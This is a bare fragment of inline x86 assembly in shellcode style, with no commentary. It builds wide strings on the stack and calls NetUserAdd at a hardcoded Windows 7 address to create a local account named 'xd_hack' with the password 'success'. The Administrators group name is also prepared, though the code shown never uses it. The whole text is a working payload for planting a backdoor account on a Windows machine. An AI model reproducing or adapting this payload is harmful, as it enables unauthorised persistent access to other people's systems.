	__asm
	{
		push ebp
		mov ebp,esp
		xor eax,eax
		//DWORD dwError = 0;
		mov DWORD ptr[ebp-04h],0	//dwError

	    //WCHAR admin_group[]=L"Administrators";  0x41 64 6D 69 6E 69 73 74 72 61 74 6F 72 73
		mov byte ptr[ebp-05h],0	//0
		mov byte ptr[ebp-06h],0	//0
		mov byte ptr[ebp-07h],0		
		mov byte ptr[ebp-08h],73h//s
		mov byte ptr[ebp-09h],0		
		mov byte ptr[ebp-0ah],72h//r
		mov byte ptr[ebp-0bh],0		
		mov byte ptr[ebp-0ch],6fh//o
		mov byte ptr[ebp-0dh],0		
		mov byte ptr[ebp-0eh],74h//t
		mov byte ptr[ebp-0fh],0		
		mov byte ptr[ebp-10h],61h//a
		mov byte ptr[ebp-11h],0		
		mov byte ptr[ebp-12h],72h//r
		mov byte ptr[ebp-13h],0		
		mov byte ptr[ebp-14h],74h//t
		mov byte ptr[ebp-15h],0		
		mov byte ptr[ebp-16h],73h//s
		mov byte ptr[ebp-17h],0		
		mov byte ptr[ebp-18h],69h//i
		mov byte ptr[ebp-19h],0		
		mov byte ptr[ebp-1ah],6eh//n
		mov byte ptr[ebp-1bh],0	
		mov byte ptr[ebp-1ch],69h//i
		mov byte ptr[ebp-1dh],0		
		mov byte ptr[ebp-1eh],6dh//m
		mov byte ptr[ebp-1fh],0		
		mov byte ptr[ebp-20h],64h//d
		mov byte ptr[ebp-21h],0		
		mov byte ptr[ebp-22h],41h//A	

	    //WCHAR pass[]=L"success";		0x73 75 63 63 65 73 73
		mov byte ptr[ebp-23h],0	//0
		mov byte ptr[ebp-24h],0	//0
		mov byte ptr[ebp-25h],0		
		mov byte ptr[ebp-26h],73h//s
		mov byte ptr[ebp-27h],0		
		mov byte ptr[ebp-28h],73h//s
		mov byte ptr[ebp-29h],0		
		mov byte ptr[ebp-2ah],65h//e
		mov byte ptr[ebp-2bh],0		
		mov byte ptr[ebp-2ch],63h//c
		mov byte ptr[ebp-2dh],0		
		mov byte ptr[ebp-2eh],63h//c
		mov byte ptr[ebp-2fh],0		
		mov byte ptr[ebp-30h],75h//u
		mov byte ptr[ebp-31h],0		
		mov byte ptr[ebp-32h],73h//s
		

        //WCHAR user[]=L"xd_hack";		0x78 64 5F 68 61 63 6B
		mov byte ptr[ebp-33h],0	//0
		mov byte ptr[ebp-34h],0	//0
		mov byte ptr[ebp-35h],0		
		mov byte ptr[ebp-36h],6bh//k
		mov byte ptr[ebp-37h],0		
		mov byte ptr[ebp-38h],63h//c
		mov byte ptr[ebp-39h],0		
		mov byte ptr[ebp-3ah],61h//a
		mov byte ptr[ebp-3bh],0		
		mov byte ptr[ebp-3ch],68h//h
		mov byte ptr[ebp-3dh],0		
		mov byte ptr[ebp-3eh],5fh//_
		mov byte ptr[ebp-3fh],0		
		mov byte ptr[ebp-40h],64h//d
		mov byte ptr[ebp-41h],0		
		mov byte ptr[ebp-42h],78h//x
		

		//USER_INFO_1 ui;
		mov DWORD ptr[ebp-48h],0		//usri1_script_path
		mov DWORD ptr[ebp-4ch],1		//usri1_flags
		mov DWORD ptr[ebp-50h],0		//usri1_comment
		mov DWORD ptr[ebp-54h],0		//usri1_home_dir
		mov DWORD ptr[ebp-58h],1		//usri1_priv
		mov DWORD ptr[ebp-5ch],0		//usri1_password_age
		lea eax,[ebp-32h]
		mov DWORD ptr[ebp-60h],eax		//password
		lea eax,[ebp-42h]					
		mov DWORD ptr[ebp-64h],eax		//username
		sub esp,64h

		//NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
		lea eax,[ebp-04h]	
 		push eax
		lea ecx,[ebp-64h]
 		push ecx
 		push 1
 		push 0
		mov eax , 0x73dc464f
 		call eax				//NetUserAdd win7 0x73dc464f
		mov esp,ebp
		pop ebp
	}
